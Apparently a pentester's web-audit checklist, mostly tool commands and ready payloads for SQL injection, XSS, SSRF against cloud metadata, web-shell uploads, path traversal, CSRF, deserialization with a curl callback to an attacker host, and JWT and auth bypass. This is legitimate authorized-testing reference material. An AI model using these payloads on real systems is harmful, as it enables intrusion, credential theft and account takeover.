Audit methodology below. Assume written authorization and defined scope; unauthenticated means no account, not out-of-scope.

## 0. Pre-flight

```bash
# scope check, then baseline
curl -sI https://target.tld | tee baseline.txt
```

Record: IPs, CDN, WAF, TLS cert SANs (extra hostnames), `Server`/`X-Powered-By`.

## 1. Fingerprinting

```bash
nmap -sV -p- --min-rate 2000 -oA nmap target.tld
httpx -u https://target.tld -title -tech-detect -status-code -web-server -cdn -o httpx.txt
whatweb -a 3 https://target.tld
wafw00f https://target.tld
```

Manual tells:
- Error page format (`Whitelabel Error Page` = Spring, `Whoops` = Laravel, `__next_data__` = Next.js).
- Cookie names: `PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`, `laravel_session`, `_rails`.
- Headers: `X-AspNet-Version`, `X-Generator`, `X-Drupal-Cache`.
- `robots.txt`, `sitemap.xml`, `/.well-known/security.txt`, `/.git/HEAD`, `/.env`.

```bash
for p in robots.txt sitemap.xml .git/HEAD .env .DS_Store server-status actuator/env; do
  printf '%-20s %s\n' "$p" "$(curl -so /dev/null -w '%{http_code}' https://target.tld/$p)"; done
```

## 2. Surface enumeration

```bash
# subdomains
subfinder -d target.tld -all -silent | httpx -silent -o subs.txt
amass enum -passive -d target.tld

# content
ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,401,403 -ac
feroxbuster -u https://target.tld -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,asp,aspx,jsp,json,js

# params
katana -u https://target.tld -jc -d 3 -o urls.txt
gau target.tld | tee gau.txt
arjun -u https://target.tld/api/endpoint -m GET,POST
```

Then: JS files for endpoints/secrets, `?debug=1`, `/api/v1` vs `/api/v2`, alternate methods (`OPTIONS`, `TRACE`), `X-Original-URL`, `X-Forwarded-For: 127.0.0.1`.

## 3. Bug classes, test order

### 3.1 SQLi

```bash
sqlmap -u 'https://target.tld/item?id=1' --batch --level=5 --risk=3 --dbs
sqlmap -r req.txt --batch --technique=BEUST --tamper=space2comment
```

Payloads (GET param `id`):
```
1' OR '1'='1
1" OR "1"="1
1' OR 1=1-- -
1' AND SLEEP(5)-- -
1'; SELECT pg_sleep(5)-- -
1' AND 1=CAST((SELECT version()) AS int)-- -
1' UNION SELECT NULL,NULL,NULL-- -
' OR 1=1 LIMIT 1 OFFSET 0-- -
1' AND extractvalue(1,concat(0x7e,version()))-- -    # MySQL error-based
1' AND 1=1;WAITFOR DELAY '0:0:5'-- -                  # MSSQL
```
Test: `'`, `"`, `\`, `)`, `';`, numeric ±1, `1 AND 1=2`. Watch time delta and error text. Test in `ORDER BY`, `LIMIT`, JSON body, `X-Forwarded-For`, cookie values.

### 3.2 XSS

Reflected:
```
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<svg/onload=alert(1)>
"><svg><script>alert(1)</script>
'-alert(1)-'
{{7*7}}${7*7}#{7*7}          # template injection probe
```

Stored: submit into every persisted field (comment, profile name, filename, support ticket, address). Re-fetch from a different page/role.

DOM: check `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `jQuery.html()`, `angular.element`.

```bash
# payload in fragment, not sent to server
https://target.tld/#<img src=x onerror=alert(document.domain)>
```

Bypasses when filtered:
```
<img src=x onerror=alert(1)>
<IMG SRC=JaVaScRiPt:alert(1)>
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg><animate onbegin=alert(1) attributeName=x>
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

### 3.3 SSRF

Probe params: `url`, `uri`, `link`, `src`, `dest`, `redirect`, `target`, `image`, `feed`, `webhook`, `callback`, `next`, `host`, `port`, `path`.

```
http://127.0.0.1
http://localhost
http://127.1
http://0x7f000001
http://2130706433
http://[::1]
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/   (needs Metadata-Flavor: Google)
http://100.100.100.200/latest/meta-data/              (Alibaba)
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
```

Use own listener to confirm: `nc -lvnp 8000` then `http://YOUR-IP:8000/`. Filter bypass via redirect (`https://your.host/r?u=http://169.254.169.254`), DNS rebinding, `@`-trick `http://target.tld@127.0.0.1`, decimal/octal IP, `http://127.0.0.1.nip.io`.

### 3.4 File upload / path traversal

Upload:
```bash
curl -F 'file=@shell.php;filename=shell.php' https://target.tld/upload
curl -F 'file=@x.jpg;filename=../../../../var/www/html/x.php' https://target.tld/upload
curl -F 'file=@x.jpg;type=image/jpeg;filename=x.php.jpg' https://target.tld/upload
```
Bypass names: `x.php`, `x.php5`, `.phtml`, `.pht`, `x.php.jpg`, `x.php%00.jpg`, `x.php.`, `x.PhP`, `x.php::$DATA`, `.htaccess` (with `AddType application/x-httpd-php .jpg`). Polyglot:
```
GIF89a;<?php system($_GET['c']); ?>
```
Check: is file served from same origin? Is content-type sniffed? Is filename reflected (→ XSS)? Is SVG accepted (→ stored XSS)?

Traversal (params `file`, `path`, `page`, `download`, `template`, `lang`):
```
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
/....//....//....//etc/passwd
..\..\..\..\windows\win.ini
file:///etc/passwd
php://filter/convert.base64-encode/resource=index.php
```
Windows: `..\..\..\windows\win.ini`, `C:\windows\win.ini`, `....\/`.

### 3.5 CSRF

Check: state-changing endpoint, no anti-CSRF token, session cookie accepted cross-site (`SameSite=None` or absent), no `Origin`/`Referer` validation.

```html
<form action="https://target.tld/account/email" method="POST">
  <input name="email" value="attacker@evil.tld">
</form>
<script>document.forms[0].submit()</script>
```
JSON endpoint: try `Content-Type: text/plain` or `application/x-www-form-urlencoded` with JSON body; try `<form enctype="text/plain">`. Test token reuse, token tied to other user, token absent on one method (PUT/DELETE), `Origin: null`.

### 3.6 Business logic

No generic payloads. Enumerate and abuse:
- Price/quantity: negative qty, `0`, `0.01`, float overflow, currency swap, coupon stacking, coupon reuse, integer overflow.
- Workflow skip: call step 3 without step 1, replay final step, change `status` param directly, `is_admin=false`→`true`, mass assignment (`"role":"admin"` in registration).
- Limits: race-free check on one-time coupon, referral self-credit, password reset token reuse.
- IDOR: swap every numeric/UUID ID in every request, including `?user_id=`, `X-User-Id`, JWT `sub`.

### 3.7 Deserialization

Detect: base64 blobs in cookies/params, `rO0AB` (Java), `O:8:"` (PHP), `\x80\x04` / `gASV` (Python pickle), `AAEAAAD` (.NET ViewState), `_$$ND_FUNC$$_` (Node).

```bash
# Java
java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR-IP/`id`' | base64 -w0
# PHP
phpggc Laravel/RCE1 system id -b
# .NET
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami"
# Python
python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(...)))'
```
Send as cookie/param/body. Confirm via DNS/HTTP callback.

### 3.8 Race conditions

Single-packet attack (HTTP/2, last-byte sync) is the reliable method:
```bash
# Burp: Repeater → "Send group in parallel (single-packet attack)"
# CLI: turbo-intruder
python3 turbo-intruder.py -u https://target.tld/redeem -d 'code=ABC' -c 20
```
Targets: coupon redeem, gift-card balance, withdraw, vote, follow, password-reset token consume, email-change confirm, inventory decrement. Look for N successes where 1 expected.

### 3.9 Auth bypass

```
# forced browsing
/admin, /admin/, /ADMIN, /admin;/, /admin%2f, /./admin, //admin, /admin..;/
# header trust
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
# JWT
alg:none  →  {"alg":"none","typ":"JWT"}.{...}.
HS256 with weak secret: hashcat -m 16500 jwt.txt rockyou.txt
kid injection: {"kid":"../../../../dev/null","alg":"HS256"}
# type juggling / logic
password[]=x  (PHP array → strcmp null)
username=admin&password=
{"user":"admin","pass":true}
# default creds
admin:admin, admin:password, root:root, test:test
# path normalization
/api/v1/users/../admin
/%2e%2e/admin
```

```bash
jwt_tool eyJ... -T          # tamper
jwt_tool eyJ... -C -d rockyou.txt
```

## 4. Report per finding

Request, response, impact, CVSS, remediation. Stop at proof of read/exec; no data exfiltration beyond what proves the bug.

Skipped: full nuclei template set, cloud-specific recon, mobile/API auth flows. Add when scope includes them.